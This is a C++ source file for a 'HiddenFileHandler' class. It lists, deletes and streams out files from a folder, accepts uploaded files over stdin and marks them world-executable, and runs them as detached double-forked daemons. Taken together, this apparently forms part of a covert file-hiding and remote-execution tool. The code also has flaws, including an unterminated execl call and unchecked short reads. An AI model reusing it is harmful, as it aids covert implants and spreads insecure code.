#include "HiddenFileHandler.h"


std::string HiddenFileHandler::getPath(const std::string fileName) {
    return folderName + "/" + fileName;
}

// Method to list the files in the directory
void HiddenFileHandler::listFiles() {
    for (const auto& entry : fs::directory_iterator(folderName))
        std::cout << entry.path() << std::endl;
}


Status HiddenFileHandler::runFile(const std::string& fileName) {
    std::string filePath = getPath(fileName);
    std::cerr << "path of file to run: " << filePath << std::endl;
    int pid = fork();
    if (pid < 0) {
        return HIDER_FORK_ERROR;
    }
    if (pid > 0){
        return SUCCSESS;
    }

    if (setsid() < 0) {
        std::cerr << "error setting setion" << std::endl;
        std::exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid < 0) {
        std::perror("Error forking second time");
        std::exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        std::exit(EXIT_SUCCESS); // Exit the parent process
    }
    execl(filePath.c_str(), "");
    std::exit(EXIT_FAILURE);
}


// Method to remove a file from the directory
Status HiddenFileHandler::deleteFile(const std::string& filename) {
    std::string filePath = getPath(filename);
    if (std::remove(filePath.c_str()) != 0) {
        return FILE_DELETION_ERROR;
    }
    return SUCCSESS;
}

Status HiddenFileHandler::retreiveFile(const std::string& filename) {
    const std::string filePath = getPath(filename);
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open the file." << std::endl;
        return FILE_NOT_OPEN_ERROR;
    }
    const std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    uint32_t fileSize = buffer.size();
    if (write(STDOUT_FILENO, &fileSize, sizeof(fileSize)) == -1) {
        std::cerr << "Error msg length" << std::endl;
        std::cerr << "Error: " << strerror(errno) << std::endl;
    }
    file.close();

    if ((write(STDOUT_FILENO, buffer.data(), fileSize)) == -1) {
        std::cerr << "Error msg length" << std::endl;
        std::cerr << "Error: " << strerror(errno) << std::endl;
    }

    return SUCCSESS;
}

Status HiddenFileHandler::uploadFile(const std::string& fileName, uint32_t fileSize) {
    char fileContent[CHUNK_SIZE] = { 0 };
    Status res = SUCCSESS;
    
    std::string filePath = getPath(fileName);
    std::ofstream outFile;
    outFile.open(filePath, std::ios::binary | std::ios::out); // open and overwrite file
    

    if (!outFile) {
        return FILE_NOT_OPEN_ERROR;
    }
    uint32_t ctr;
    for (ctr = 0; ctr < fileSize && res == SUCCSESS; ctr += sizeof(fileContent))
    {
        int tranferAmount = MIN(sizeof(fileContent), fileSize - ctr);
        // TODO recv exact amount
        if (read(STDIN_FILENO, fileContent, tranferAmount) < 0) {
            std::cerr << "Error reciving file contesnt from socket" << std::endl;
            std::cerr << "Error: " << strerror(errno) << std::endl;
            res = RECV_FILE_CONTENT_ERROR;
        }
        outFile.write(fileContent, tranferAmount);
        if (!outFile) {
            std::cerr << "Error writting to file " << std::endl;
            std::cerr << "Error: " << strerror(errno) << std::endl;
            res = FILE_WRITE_ERROR;
        }
    }
    outFile.close();


    if (res != SUCCSESS) {
        return res;
    }

    if (chmod(filePath.c_str(), S_IRWXU | S_IRWXG | S_IRWXO) != 0)
    {
        std::cerr << "Failed to set executable permission." << std::endl;
        return CHMOD_TO_EXE_ERROR;
    }
    return SUCCSESS;
}
